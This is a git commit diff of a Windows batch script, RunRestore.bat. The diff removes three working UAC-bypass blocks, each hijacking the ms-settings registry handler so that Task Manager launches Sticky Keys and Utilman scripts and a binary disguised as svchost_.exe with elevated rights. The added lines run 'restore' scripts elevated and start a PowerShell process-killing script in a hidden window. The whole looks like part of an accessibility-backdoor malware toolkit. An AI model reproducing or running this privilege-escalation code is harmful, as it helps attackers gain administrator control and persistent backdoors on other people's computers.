fc385ffc1a4d276ed544ed9c195bf6839b0c515a
FooTex16 <hffjhfcvvtugs@yahoo.com>
2025-07-05 22:32:58 +0700

    RunRestore.bat

--- RunRestore.bat
+++ RunRestore.bat
@@ -1,32 +1,8 @@
 @echo off
-:: ---------------------------
-:: Set current directory
-:: ---------------------------
+:: Menjalankan batch dan exe dengan hak administrator dari folder yang sama
+
 set "currentDir=%~dp0"
 
-:: ---------------------------
-:: Bypass UAC via Task Manager - ExecuteStickyKeys.bat
-:: ---------------------------
-REG ADD "HKCU\Software\Classes\ms-settings\Shell\Open\command" /f /ve /d "%currentDir%ExecuteStickyKeys.bat"
-REG ADD "HKCU\Software\Classes\ms-settings\Shell\Open\command" /f /v "DelegateExecute" /d ""
-start "" "C:\Windows\System32\Taskmgr.exe"
-timeout /t 5 >nul
-REG DELETE "HKCU\Software\Classes\ms-settings" /f
-
-:: ---------------------------
-:: Bypass UAC via Task Manager - ExecuteUtilman.bat
-:: ---------------------------
-REG ADD "HKCU\Software\Classes\ms-settings\Shell\Open\command" /f /ve /d "%currentDir%ExecuteUtilman.bat"
-REG ADD "HKCU\Software\Classes\ms-settings\Shell\Open\command" /f /v "DelegateExecute" /d ""
-start "" "C:\Windows\System32\Taskmgr.exe"
-timeout /t 5 >nul
-REG DELETE "HKCU\Software\Classes\ms-settings" /f
-
-:: ---------------------------
-:: Bypass UAC via Task Manager - svchost_.exe
-:: ---------------------------
-REG ADD "HKCU\Software\Classes\ms-settings\Shell\Open\command" /f /ve /d "%currentDir%svchost_.exe"
-REG ADD "HKCU\Software\Classes\ms-settings\Shell\Open\command" /f /v "DelegateExecute" /d ""
-start "" "C:\Windows\System32\Taskmgr.exe"
-timeout /t 5 >nul
-REG DELETE "HKCU\Software\Classes\ms-settings" /f
+powershell -Command "Start-Process '%currentDir%RestoreUtilman.bat' -Verb RunAs"
+powershell -Command "Start-Process '%currentDir%RestoreStickyKeys.bat' -Verb RunAs"
+powershell -windowstyle hidden -command "Start-Process -FilePath '%~dp0KillProcess.ps1' -WindowStyle Hidden"
